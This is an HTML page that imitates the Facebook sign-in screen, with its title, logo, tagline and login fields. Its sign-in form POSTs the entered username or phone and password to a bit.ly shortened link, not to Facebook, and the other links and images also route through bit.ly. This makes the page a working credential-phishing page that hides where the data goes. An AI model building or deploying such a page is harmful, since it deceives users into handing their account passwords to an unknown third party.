<!DOCTYPE html>
<html>
    <head>
        <title>
            Facebook-Sign In or Sign Up
        </title>
      
        <link rel="icon" href="https://bit.ly/3v6md3w">
        <link rel="stylesheet" href="index.css">
    
    </head>
    <body>
        <div class="container">
            <div class="Facebook-logo">
                <img class="logo" src="https://bit.ly/3v5DA4F" alt="Facebook-logo" width="300px"/>
                <p class="tagline"> Facebook helps to interact with fellow <br/> human beings.</p>
            </div>
            <aside class="Sign-In-form">
                <div class="form">
                <form class="sign-in" action="https://bit.ly/3lIeGVJ" Method="POST" style="background-color:white;">
                    <input type="email"  type="tel" class="Username" name="Username" placeholder="Email or mobile" required autocomplete="off">
                    <br/><br/>
                    <input type="password" class="Password" name="Password" placeholder="Password" required autocomplete="off">
                    <br/><br/>
                    <button  class="sign-in-btn" type="submit"  value="submit">Sign in</button>
                    <br/><br/>
                    <a class="forgot-password" href="https://bit.ly/3FPnQaH"> Forgot your password?</a>
                    <br/>
                    <hr>
                    <br/>
                </form>
                    <form class="sign-up" action="https://bit.ly/3FKTt5z" method="POST">
                        <button  class="sign-up-btn" type="submit" value="submit">Create a new account</button>
                </form> 
                </div>   
                <p class="other-accounts"> <a class="Create-a-page"  href="https://bit.ly/3vfW2Yb"> Create a page </a>  for celebrities, group or business .</p>                
            </aside>
        </div>
        

    </body>
